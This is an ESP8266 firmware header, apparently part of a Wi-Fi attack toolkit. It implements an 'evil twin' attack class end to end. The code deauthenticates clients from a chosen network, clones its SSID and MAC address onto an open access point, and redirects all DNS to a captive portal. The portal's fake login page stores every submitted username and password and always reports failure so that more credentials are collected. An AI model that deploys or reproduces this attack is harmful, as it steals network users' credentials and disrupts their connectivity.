#ifndef EVIL_TWIN_H
#define EVIL_TWIN_H

#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include "wifi_structs.h"
#include "storage.h"
#include "deauth.h"

class EvilTwinAttack {
private:
    WiFiNetwork target;
    bool running = false;
    DNSServer* dnsServer;
    ESP8266WebServer* webServer;
    uint8_t maxClients = 4;
    bool autoSaveCredentials = true;
    String originalSSID;
    uint8_t originalMAC[6];
    int attackStage = 0; // 0: Not started, 1: Deauthing, 2: Evil Twin Active
    unsigned long lastDeauth = 0;
    const unsigned long DEAUTH_INTERVAL = 1000;
    DeauthAttack deauther;

public:
    void begin(DNSServer* dns, ESP8266WebServer* web) {
        dnsServer = dns;
        webServer = web;
        deauther.begin();
    }

    void setTarget(WiFiNetwork network) {
        target = network;
        originalSSID = WiFi.softAPSSID();
        WiFi.softAPmacAddress(originalMAC);
        deauther.clearTargets();
        deauther.setTarget(target.getBSSIDString());
    }

    void start() {
        if (!running) {
            running = true;
            attackStage = 1;
            
            // Start deauthing
            deauther.start();
            
            // Wait a bit before starting the evil twin
            delay(2000);
            
            // Configure AP with target settings
            WiFi.mode(WIFI_AP_STA);
            WiFi.softAP(target.ssid.c_str(), "", target.channel, false, maxClients);
            
            // Clone target MAC address
            uint8_t targetMAC[6];
            memcpy(targetMAC, target.bssid, 6);
            wifi_set_macaddr(SOFTAP_IF, targetMAC);
            
            // Setup captive portal
            dnsServer->setErrorReplyCode(DNSReplyCode::NoError);
            dnsServer->start(53, "*", WiFi.softAPIP());
            setupWebServer();
            
            attackStage = 2;
        }
    }

    void stop() {
        if (running) {
            running = false;
            attackStage = 0;
            
            // Stop deauthing
            deauther.stop();
            
            // Restore original AP settings
            WiFi.softAP(originalSSID.c_str());
            wifi_set_macaddr(SOFTAP_IF, originalMAC);
            
            // Stop servers
            dnsServer->stop();
            webServer->stop();
        }
    }

    void update() {
        if (!running) return;

        // Handle deauthing in stage 1
        if (attackStage == 1) {
            unsigned long currentTime = millis();
            if (currentTime - lastDeauth >= DEAUTH_INTERVAL) {
                deauther.update();
                lastDeauth = currentTime;
            }
        }
        
        // Handle captive portal in stage 2
        if (attackStage == 2) {
            dnsServer->processNextRequest();
            webServer->handleClient();
        }
    }

    String getStatus() {
        String status = "Evil Twin:\n";
        status += "Target: " + target.ssid + "\n";
        status += "Stage: ";
        
        switch(attackStage) {
            case 0:
                status += "Stopped";
                break;
            case 1:
                status += "Deauthing";
                break;
            case 2:
                status += "Portal Active\n";
                status += "Clients: " + String(WiFi.softAPgetStationNum());
                break;
        }
        
        return status;
    }

private:
    void setupWebServer() {
        webServer->onNotFound([this]() {
            webServer->sendHeader("Location", "http://" + WiFi.softAPIP().toString());
            webServer->send(302, "text/plain", "");
        });

        webServer->on("/", HTTP_GET, [this]() {
            webServer->send(200, "text/html", generatePortalPage());
        });

        webServer->on("/login", HTTP_POST, [this]() {
            String username = webServer->arg("username");
            String password = webServer->arg("password");
            
            if (autoSaveCredentials) {
                storageManager.saveCredentials(target.ssid, username, password);
            }
            
            // Always return authentication failed to keep collecting
            webServer->send(200, "text/html", 
                "Authentication failed. Please try again.<meta http-equiv='refresh' content='2;url=/'>");
        });

        webServer->begin();
    }

    String generatePortalPage() {
        return R"(
            <html><head>
            <meta name='viewport' content='width=device-width, initial-scale=1'>
            <style>
                body { font-family: Arial; text-align: center; margin: 0; padding: 20px; }
                .container { max-width: 400px; margin: 0 auto; }
                input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
                button { width: 100%; padding: 10px; background: #4CAF50; color: white; 
                         border: none; border-radius: 5px; cursor: pointer; }
                .error { color: red; margin: 10px 0; }
            </style>
            </head><body>
            <div class='container'>
                <h2>Network Authentication Required</h2>
                <p>Please enter your credentials to access the network.</p>
                <form method='POST' action='/login'>
                    <input type='text' name='username' placeholder='Username or Email'>
                    <input type='password' name='password' placeholder='Password'>
                    <button type='submit'>Connect</button>
                </form>
            </div>
            </body></html>
        )";
    }
};

#endif 